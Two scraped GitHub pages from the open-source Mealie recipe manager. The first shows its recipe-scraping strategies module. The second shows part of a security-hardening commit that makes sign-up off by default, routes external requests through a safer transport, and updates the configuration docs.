=== Content from github.com_ac062e24_20250111_170101.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmealie-recipes%2Fmealie%2Fblob%2Fmealie-next%2Fmealie%2Fservices%2Fscraper%2Fscraper_strategies.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmealie-recipes%2Fmealie%2Fblob%2Fmealie-next%2Fmealie%2Fservices%2Fscraper%2Fscraper_strategies.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=mealie-recipes%2Fmealie)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mealie-recipes](/mealie-recipes)
/
**[mealie](/mealie-recipes/mealie)**
Public

* [Notifications](/login?return_to=%2Fmealie-recipes%2Fmealie) You must be signed in to change notification settings
* [Fork
  787](/login?return_to=%2Fmealie-recipes%2Fmealie)
* [Star
   7.9k](/login?return_to=%2Fmealie-recipes%2Fmealie)

* [Code](/mealie-recipes/mealie)
* [Issues
  71](/mealie-recipes/mealie/issues)
* [Pull requests
  27](/mealie-recipes/mealie/pulls)
* [Discussions](/mealie-recipes/mealie/discussions)
* [Actions](/mealie-recipes/mealie/actions)
* [Security](/mealie-recipes/mealie/security)
* [Insights](/mealie-recipes/mealie/pulse)

Additional navigation options

* [Code](/mealie-recipes/mealie)
* [Issues](/mealie-recipes/mealie/issues)
* [Pull requests](/mealie-recipes/mealie/pulls)
* [Discussions](/mealie-recipes/mealie/discussions)
* [Actions](/mealie-recipes/mealie/actions)
* [Security](/mealie-recipes/mealie/security)
* [Insights](/mealie-recipes/mealie/pulse)

## Files

 mealie-next
## Breadcrumbs

1. [mealie](/mealie-recipes/mealie/tree/mealie-next)
2. /[mealie](/mealie-recipes/mealie/tree/mealie-next/mealie)
3. /[services](/mealie-recipes/mealie/tree/mealie-next/mealie/services)
4. /[scraper](/mealie-recipes/mealie/tree/mealie-next/mealie/services/scraper)
/
# scraper\_strategies.py

Copy path Blame  Blame
## Latest commit

## History

[History](/mealie-recipes/mealie/commits/mealie-next/mealie/services/scraper/scraper_strategies.py)384 lines (301 loc) · 12.8 KB mealie-next
## Breadcrumbs

1. [mealie](/mealie-recipes/mealie/tree/mealie-next)
2. /[mealie](/mealie-recipes/mealie/tree/mealie-next/mealie)
3. /[services](/mealie-recipes/mealie/tree/mealie-next/mealie/services)
4. /[scraper](/mealie-recipes/mealie/tree/mealie-next/mealie/services/scraper)
/
# scraper\_strategies.py

Top
## File metadata and controls

* Code
* Blame

384 lines (301 loc) · 12.8 KB[Raw](https://github.com/mealie-recipes/mealie/raw/refs/heads/mealie-next/mealie/services/scraper/scraper_strategies.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384import timefrom abc import ABC, abstractmethodfrom collections.abc import Callablefrom typing import Any
import bs4import extructfrom fastapi import HTTPException, statusfrom httpx import AsyncClientfrom recipe\_scrapers import NoSchemaFoundInWildMode, SchemaScraperFactory, scrape\_htmlfrom slugify import slugifyfrom w3lib.html import get\_base\_url
from mealie.core.config import get\_app\_settingsfrom mealie.core.root\_logger import get\_loggerfrom mealie.lang.providers import Translatorfrom mealie.pkgs import safehttpfrom mealie.schema.recipe.recipe import Recipe, RecipeStepfrom mealie.services.openai import OpenAIServicefrom mealie.services.scraper.scraped\_extras import ScrapedExtras
from . import cleaner
try: from recipe\_scrapers.\_abstract import HEADERS
 \_FIREFOX\_UA = HEADERS["User-Agent"]except (ImportError, KeyError): \_FIREFOX\_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/128.0"
SCRAPER\_TIMEOUT = 15
class ForceTimeoutException(Exception): pass
async def safe\_scrape\_html(url: str) -> str: """ Scrapes the html from a url but will cancel the request if the request takes longer than 15 seconds. This is used to mitigate DDOS attacks from users providing a url with arbitrary large content. """ async with AsyncClient(transport=safehttp.AsyncSafeTransport()) as client: html\_bytes = b"" async with client.stream( "GET", url, timeout=SCRAPER\_TIMEOUT, headers={"User-Agent": \_FIREFOX\_UA}, follow\_redirects=True ) as resp: start\_time = time.time()
 async for chunk in resp.aiter\_bytes(chunk\_size=1024): html\_bytes += chunk
 if time.time() - start\_time > SCRAPER\_TIMEOUT: raise ForceTimeoutException()
 # ===================================== # Copied from requests text property
 # Try charset from content-type content = None encoding = resp.encoding
 if not html\_bytes: return ""
 # Fallback to auto-detected encoding. if encoding is None: encoding = resp.apparent\_encoding
 # Decode unicode from given encoding. try: content = str(html\_bytes, encoding, errors="replace") except (LookupError, TypeError): # A LookupError is raised if the encoding was not found which could # indicate a misspelling or similar mistake. # # A TypeError can be raised if encoding is None # # So we try blindly encoding. content = str(html\_bytes, errors="replace")
 return content
class ABCScraperStrategy(ABC): """ Abstract class for all recipe parsers. """
 url: str
 def \_\_init\_\_( self, url: str, translator: Translator, raw\_html: str | None = None, ) -> None: self.logger = get\_logger() self.url = url self.raw\_html = raw\_html self.translator = translator
 @abstractmethod async def get\_html(self, url: str) -> str: ...
 @abstractmethod async def parse(self) -> tuple[Recipe, ScrapedExtras] | tuple[None, None]: """Parse a recipe from a web URL.
 Args: recipe\_url (str): Full URL of the recipe to scrape.
 Returns: Recipe: Recipe object. """ ...
class RecipeScraperPackage(ABCScraperStrategy): @staticmethod def ld\_json\_to\_html(ld\_json: str) -> str: return ( "<!DOCTYPE html><html><head>" f'<script type="application/ld+json">{ld\_json}</script>' "</head><body></body></html>" )
 async def get\_html(self, url: str) -> str: return self.raw\_html or await safe\_scrape\_html(url)
 def clean\_scraper(self, scraped\_data: SchemaScraperFactory.SchemaScraper, url: str) -> tuple[Recipe, ScrapedExtras]: def try\_get\_default( func\_call: Callable | None, get\_attr: str, default: Any, clean\_func=None, \*\*clean\_func\_kwargs, ): value = default
 if func\_call: try: value = func\_call() except Exception: self.logger.error(f"Error parsing recipe func\_call for '{get\_attr}'")
 if value == default: try: value = scraped\_data.schema.data.get(get\_attr) except Exception: self.logger.error(f"Error parsing recipe attribute '{get\_attr}'")
 if clean\_func: value = clean\_func(value, \*\*clean\_func\_kwargs)
 return value
 def get\_instructions() -> list[RecipeStep]: instruction\_as\_text = try\_get\_default( scraped\_data.instructions, "recipeInstructions", ["No Instructions Found"], )
 self.logger.debug(f"Scraped Instructions: (Type: {type(instruction\_as\_text)}) \n {instruction\_as\_text}")
 instruction\_as\_text = cleaner.clean\_instructions(instruction\_as\_text)
 self.logger.debug(f"Cleaned Instructions: (Type: {type(instruction\_as\_text)}) \n {instruction\_as\_text}")
 try: return [RecipeStep(title="", text=x.get("text")) for x in instruction\_as\_text] except TypeError: return []
 cook\_time = try\_get\_default( None, "performTime", None, cleaner.clean\_time, translator=self.translator ) or try\_get\_default(None, "cookTime", None, cleaner.clean\_time, translator=self.translator)
 extras = ScrapedExtras()
 extras.set\_tags(try\_get\_default(None, "keywords", "", cleaner.clean\_tags))
 recipe = Recipe( name=try\_get\_default(scraped\_data.title, "name", "No Name Found", cleaner.clean\_string), slug="", image=try\_get\_default(None, "image", None, cleaner.clean\_image), description=try\_get\_default(None, "description", "", cleaner.clean\_string), nutrition=try\_get\_default(None, "nutrition", None, cleaner.clean\_nutrition), recipe\_yield=try\_get\_default(scraped\_data.yields, "recipeYield", "1", cleaner.clean\_string), recipe\_ingredient=try\_get\_default( scraped\_data.ingredients, "recipeIngredient", [""], cleaner.clean\_ingredients, ), recipe\_instructions=get\_instructions(), total\_time=try\_get\_default(None, "totalTime", None, cleaner.clean\_time, translator=self.translator), prep\_time=try\_get\_default(None, "prepTime", None, cleaner.clean\_time, translator=self.translator), perform\_time=cook\_time, org\_url=url or try\_get\_default(None, "url", None, cleaner.clean\_string), )
 return recipe, extras
 async def scrape\_url(self) -> SchemaScraperFactory.SchemaScraper | Any | None: recipe\_html = await self.get\_html(self.url)
 try: # scrape\_html requires a URL, but we might not have one, so we default to a dummy URL scraped\_schema = scrape\_html(recipe\_html, org\_url=self.url or "https://example.com", supported\_only=False) except (NoSchemaFoundInWildMode, AttributeError): self.logger.error(f"Recipe Scraper was unable to extract a recipe from {self.url}") return None
 except ConnectionError as e: raise HTTPException(status.HTTP\_400\_BAD\_REQUEST, {"details": "CONNECTION\_ERROR"}) from e
 # Check to see if the recipe is valid try: ingredients = scraped\_schema.ingredients() except Exception: ingredients = []
 try: instruct: list | str = scraped\_schema.instructions() except Exception: instruct = []
 if instruct or ingredients: return scraped\_schema
 self.logger.debug(f"Recipe Scraper [Package] was unable to extract a recipe from {self.url}") return None
 async def parse(self): """ Parse a recipe from a given url. """ scraped\_data = await self.scrape\_url()
 if scraped\_data is None: return None
 return self.clean\_scraper(scraped\_data, self.url)
class RecipeScraperOpenAI(RecipeScraperPackage): """ A wrapper around the `RecipeScraperPackage` class that uses OpenAI to extract the recipe from the URL, rather than trying to scrape it directly. """
 def extract\_json\_ld\_data\_from\_html(self, soup: bs4.BeautifulSoup) -> str: data\_parts: list[str] = [] for script in soup.find\_all("script", type="application/ld+json"): try: script\_data = script.string if script\_data: data\_parts.append(str(script\_data)) except AttributeError: pass
 return "\n\n".join(data\_parts)
 def find\_image(self, soup: bs4.BeautifulSoup) -> str | None: # find the open graph image tag og\_image = soup.find("meta", property="og:image") if og\_image and og\_image.get("content"): return og\_image["content"]
 # find the largest image on the page largest\_img = None max\_size = 0 for img in soup.find\_all("img"): width = img.get("width", 0) height = img.get("height", 0) if not width or not height: continue
 try: size = int(width) \* int(height) except (ValueError, TypeError): size = 1 if size > max\_size: max\_size = size largest\_img = img
 if largest\_img: return largest\_img.get("src")
 return None
 def format\_html\_to\_text(self, html: str) -> str: soup = bs4.BeautifulSoup(html, "lxml")
 text = soup.get\_text(separator="\n", strip=True) text += self.extract\_json\_ld\_data\_from\_html(soup) if not text: raise Exception("No text or ld+json data found in HTML")
 try: image = self.find\_image(soup) except Exception: image = None
 components = [f"Convert this content to JSON: {text}"] if image: components.append(f"Recipe Image: {image}") return "\n".join(components)
 async def get\_html(self, url: str) -> str: settings = get\_app\_settings() if not settings.OPENAI\_ENABLED: return ""
 html = self.raw\_html or await safe\_scrape\_html(url) text = self.format\_html\_to\_text(html) try: service = OpenAIService() prompt = service.get\_prompt("recipes.scrape-recipe")
 response\_json = await service.get\_response(prompt, text, force\_json\_response=True) if not response\_json: raise Exception("OpenAI did not return any data")
 return self.ld\_json\_to\_html(response\_json) except Exception: self.logger.exception(f"OpenAI was unable to extract a recipe from {url}") return ""
class RecipeScraperOpenGraph(ABCScraperStrategy): async def get\_html(self, url: str) -> str: return self.raw\_html or await safe\_scrape\_html(url)
 def get\_recipe\_fields(self, html) -> dict | None: """ Get the recipe fields from the Open Graph data. """
 def og\_field(properties: dict, field\_name: str) -> str: return next((val for name, val in properties if name == field\_name), "")
 def og\_fields(properties: list[tuple[str, str]], field\_name: str) -> list[str]: return list({val for name, val in properties if name == field\_name})
 base\_url = get\_base\_url(html, self.url) data = extruct.extract(html, base\_url=base\_url, errors="log") try: properties = data["opengraph"][0]["properties"] except Exception: return None
 return { "name": og\_field(properties, "og:title"), "description": og\_field(properties, "og:description"), "image": og\_field(properties, "og:image"), "recipeYield": "", "recipeIngredient": ["Could not detect ingredients"], "recipeInstructions": [{"text": "Could not detect instructions"}], "slug": slugify(og\_field(properties, "og:title")), "orgURL": self.url or og\_field(properties, "og:url"), "categories": [], "tags": og\_fields(properties, "og:article:tag"), "dateAdded": None, "notes": [], "extras": [], }
 async def parse(self): """ Parse a recipe from a given url. """ html = await self.get\_html(self.url)
 og\_data = self.get\_recipe\_fields(html)
 if og\_data is None: return None
 return Recipe(\*\*og\_data), ScrapedExtras()

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_8c9d73a5_20250111_170102.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmealie-recipes%2Fmealie%2Fcommit%2F2a3463b7466bc297aede50046da9550d919ec56f)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmealie-recipes%2Fmealie%2Fcommit%2F2a3463b7466bc297aede50046da9550d919ec56f)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=mealie-recipes%2Fmealie)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mealie-recipes](/mealie-recipes)
/
**[mealie](/mealie-recipes/mealie)**
Public

* [Notifications](/login?return_to=%2Fmealie-recipes%2Fmealie) You must be signed in to change notification settings
* [Fork
  787](/login?return_to=%2Fmealie-recipes%2Fmealie)
* [Star
   7.9k](/login?return_to=%2Fmealie-recipes%2Fmealie)

* [Code](/mealie-recipes/mealie)
* [Issues
  71](/mealie-recipes/mealie/issues)
* [Pull requests
  27](/mealie-recipes/mealie/pulls)
* [Discussions](/mealie-recipes/mealie/discussions)
* [Actions](/mealie-recipes/mealie/actions)
* [Security](/mealie-recipes/mealie/security)
* [Insights](/mealie-recipes/mealie/pulse)

Additional navigation options

* [Code](/mealie-recipes/mealie)
* [Issues](/mealie-recipes/mealie/issues)
* [Pull requests](/mealie-recipes/mealie/pulls)
* [Discussions](/mealie-recipes/mealie/discussions)
* [Actions](/mealie-recipes/mealie/actions)
* [Security](/mealie-recipes/mealie/security)
* [Insights](/mealie-recipes/mealie/pulse)

## Commit

[Permalink](/mealie-recipes/mealie/commit/2a3463b7466bc297aede50046da9550d919ec56f)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

security: gh security recs ([#3368](https://github.com/mealie-recipes/mealie/pull/3368))

[Browse files](/mealie-recipes/mealie/tree/2a3463b7466bc297aede50046da9550d919ec56f)
Browse the repository at this point in the history

```
* change ALLOW_SIGNUP to default to false

* add 1.4.0 tag for OIDC docs

* new notes on security inline with security/policy review

* safer transport for external requests

* fix linter errors

* docs: Tidy up wording/formatting

* fix request errors

* whoops

* fix implementation with std lib

* format

* Remove check on netloc_parts. It only includes URL after any @

---------

Co-authored-by: boc-the-git <3479092+boc-the-git@users.noreply.github.com>
Co-authored-by: Brendan <b.oconnell14@gmail.com>
```

* Loading branch information

[![@hay-kot](https://avatars.githubusercontent.com/u/64056131?s=40&v=4)](/hay-kot) [![@boc-the-git](https://avatars.githubusercontent.com/u/3479092?s=40&v=4)](/boc-the-git)

3 people

authored
Apr 2, 2024

1 parent
[737a370](/mealie-recipes/mealie/commit/737a37087471f1d665cd8995a760d4c3036fb7cf)

commit 2a3463b

 Show file tree

 Hide file tree

Showing
**11 changed files**
with
**180 additions**
and
**54 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* docs

  + docs/documentation/getting-started

    - authentication

      * docs/docs/documentation/getting-started/authentication/oidc.md
        [oidc.md](#diff-385abcf5c76815e04fa66e32951d3becbf0a680a070b97ec2c6ddb5014c29123)
    - installation

      * docs/docs/documentation/getting-started/installation/backend-config.md
        [backend-config.md](#diff-11bf89104b9eefea0e0e74f1c3d89a962fcb8b1d226fd84ee3d858ab1653c7cc)
      * docs/docs/documentation/getting-started/installation/security.md
        [security.md](#diff-f886eb5da05853204da4967a1098fbb91ce0452a20bc26780d481529637630f9)
  + docs/mkdocs.yml
    [mkdocs.yml](#diff-7618337a88ea47f9b778a21f0e17d43eab2aba4880c6be2d95a7bf95e4b8b2df)
* mealie

  + core/settings

    - mealie/core/settings/settings.py
      [settings.py](#diff-b2c7c4d6222f2e15f9f89e851b4a98b2562e58919ace9bd207cb4a4109f05c40)
  + pkgs/safehttp

    - mealie/pkgs/safehttp/\_\_init\_\_.py
      [\_\_init\_\_.py](#diff-0582c796706b4aae479c713aec8df9fa879e421126f5483e9d21d8309e5a5174)
    - mealie/pkgs/safehttp/transport.py
      [transport.py](#diff-7cabaaea41f93e5009444bbd80f48921596f95ead3e41ee45f1fe154d41be858)
  + services

    - recipe

      * mealie/services/recipe/recipe\_data\_service.py
        [recipe\_data\_service.py](#diff-4bbc3b382063eafb2e5aaafee2fe4b72b996da6a28ac9ba5e99a7cc45de87788)
    - scraper

      * mealie/services/scraper/scraper.py
        [scraper.py](#diff-e2738538e9122d7d8abbb0524597bc8ecc313dcfb07a69c6b15f6cc11a3b0116)
      * mealie/services/scraper/scraper\_strategies.py
        [scraper\_strategies.py](#diff-edec6f991f22145fdd68e3683d71044c880158f3d6b1dea61d50cb51f9fdb194)
* tests

  + tests/conftest.py
    [conftest.py](#diff-e52e4ddd58b7ef887ab03c04116e676f6280b824ab7469d5d3080e5cba4f2128)

## There are no files selected for viewing

2 changes: 2 additions & 0 deletions

2
[docs/docs/documentation/getting-started/authentication/oidc.md](#diff-385abcf5c76815e04fa66e32951d3becbf0a680a070b97ec2c6ddb5014c29123 "docs/docs/documentation/getting-started/authentication/oidc.md")

Show comments

[View file](/mealie-recipes/mealie/blob/2a3463b7466bc297aede50046da9550d919ec56f/docs/docs/documentation/getting-started/authentication/oidc.md)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

|  |  | @@ -1,5 +1,7 @@ |
|  |  | # OpenID Connect (OIDC) Authentication |
|  |  |  |
|  |  | :octicons-tag-24: v1.4.0 |
|  |  |  |
|  |  | Mealie supports 3rd party authentication via [OpenID Connect (OIDC)](https://openid.net/connect/), an identity layer built on top of OAuth2. OIDC is supported by many Identity Providers (IdP), including: |
|  |  |  |
|  |  | - [Authentik](https://goauthentik.io/integrations/sources/oauth/#openid-connect) |
| Expand Down | |  |

51 changes: 27 additions & 24 deletions

51
[docs/docs/documentation/getting-started/installation/backend-config.md](#diff-11bf89104b9eefea0e0e74f1c3d89a962fcb8b1d226fd84ee3d858ab1653c7cc "docs/docs/documentation/getting-started/installation/backend-config.md")

Show comments

[View file](/mealie-recipes/mealie/blob/2a3463b7466bc297aede50046da9550d919ec56f/docs/docs/documentation/getting-started/installation/backend-config.md)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -4,17 +4,19 @@ |
|  |  |  |
|  |  | ### General |
|  |  |  |
|  |  | | Variables | Default | Description | |
|  |  | | ------------- | :-------------------: | ----------------------------------------------------------------------------------- | |
|  |  | | PUID | 911 | UserID permissions between host OS and container | |
|  |  | | PGID | 911 | GroupID permissions between host OS and container | |
|  |  | | DEFAULT\_GROUP | Home | The default group for users | |
|  |  | | BASE\_URL | http://localhost:8080 | Used for Notifications | |
|  |  | | TOKEN\_TIME | 48 | The time in hours that a login/auth token is valid | |
|  |  | | API\_PORT | 9000 | The port exposed by backend API. \*\*Do not change this if you're running in Docker\*\* | |
|  |  | | API\_DOCS | True | Turns on/off access to the API documentation locally. | |
|  |  | | TZ | UTC | Must be set to get correct date/time on the server | |
|  |  | | ALLOW\_SIGNUP | true | Allow user sign-up without token | |
|  |  | | Variables | Default | Description | |
|  |  | | ----------------------------- | :-------------------: | ----------------------------------------------------------------------------------- | |
|  |  | | PUID | 911 | UserID permissions between host OS and container | |
|  |  | | PGID | 911 | GroupID permissions between host OS and container | |
|  |  | | DEFAULT\_GROUP | Home | The default group for users | |
|  |  | | BASE\_URL | http://localhost:8080 | Used for Notifications | |
|  |  | | TOKEN\_TIME | 48 | The time in hours that a login/auth token is valid | |
|  |  | | API\_PORT | 9000 | The port exposed by backend API. \*\*Do not change this if you're running in Docker\*\* | |
|  |  | | API\_DOCS | True | Turns on/off access to the API documentation locally. | |
|  |  | | TZ | UTC | Must be set to get correct date/time on the server | |
|  |  | | ALLOW\_SIGNUP<super>\\*</super> | false | Allow user sign-up without token | |
|  |  |  |
|  |  | <super>\\*</super> Starting in v1.4.0 this was changed to default to `false` as apart of a security review of the application. |
|  |  |  |
|  |  | ### Security |
|  |  |  |
| Expand Down  Expand Up | | @@ -77,20 +79,22 @@ Changing the webworker settings may cause unforeseen memory leak issues with Mea |
|  |  |  |
|  |  | ### OpenID Connect (OIDC) |
|  |  |  |
|  |  | :octicons-tag-24: v1.4.0 |
|  |  |  |
|  |  | For usage, see [Usage - OpenID Connect](../authentication/oidc.md) |
|  |  |  |
|  |  | | Variables | Default | Description | |
|  |  | | --- | :--: | --- | |
|  |  | | OIDC\_AUTH\_ENABLED | False | Enables authentication via OpenID Connect | |
|  |  | | OIDC\_SIGNUP\_ENABLED | True | Enables new users to be created when signing in for the first time with OIDC | |
|  |  | | OIDC\_CONFIGURATION\_URL | None | The URL to the OIDC configuration of your provider. This is usually something like https://auth.example.com/.well-known/openid-configuration | |
|  |  | | OIDC\_CLIENT\_ID | None | The client id of your configured client in your provider | |
|  |  | | OIDC\_USER\_GROUP| None | If specified, only users belonging to this group will be able to successfully authenticate, regardless of the `OIDC\_ADMIN\_GROUP`. For more information see [this page](../authentication/oidc.md#groups) | |
|  |  | | OIDC\_ADMIN\_GROUP | None | If specified, users belonging to this group will be made an admin. For more information see [this page](../authentication/oidc.md#groups) | |
|  |  | | OIDC\_AUTO\_REDIRECT | False | If `True`, then the login page will be bypassed an you will be sent directly to your Identity Provider. You can still get to the login page by adding `?direct=1` to the login URL | |
|  |  | | OIDC\_PROVIDER\_NAME | OAuth | The provider name is shown in SSO login button. "Login with <OIDC\_PROVIDER\_NAME\>" | |
|  |  | | OIDC\_REMEMBER\_ME | False | Because redirects bypass the login screen, you cant extend your session by clicking the "Remember Me" checkbox. By setting this value to true, a session will be extended as if "Remember Me" was checked | |
|  |  | | OIDC\_SIGNING\_ALGORITHM | RS256 | The algorithm used to sign the id token (examples: RS256, HS256) | |
|  |  | | Variables  | Default | Description  | |
|  |  | | ---------------------- | :-----: | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | |
|  |  | | OIDC\_AUTH\_ENABLED  | False  | Enables authentication via OpenID Connect  | |
|  |  | | OIDC\_SIGNUP\_ENABLED  | True  | Enables new users to be created when signing in for the first time with OIDC  | |
|  |  | | OIDC\_CONFIGURATION\_URL |  None  | The URL to the OIDC configuration of your provider. This is usually something like https://auth.example.com/.well-known/openid-configuration  | |
|  |  | | OIDC\_CLIENT\_ID  | None  | The client id of your configured client in your provider  | |
|  |  | | OIDC\_USER\_GROUP | None  | If specified, only users belonging to this group will be able to successfully authenticate, regardless of the `OIDC\_ADMIN\_GROUP`. For more information see [this page](../authentication/oidc.md#groups)  | |
|  |  | | OIDC\_ADMIN\_GROUP  | None  | If specified, users belonging to this group will be made an admin. For more information see [this page](../authentication/oidc.md#groups)  | |
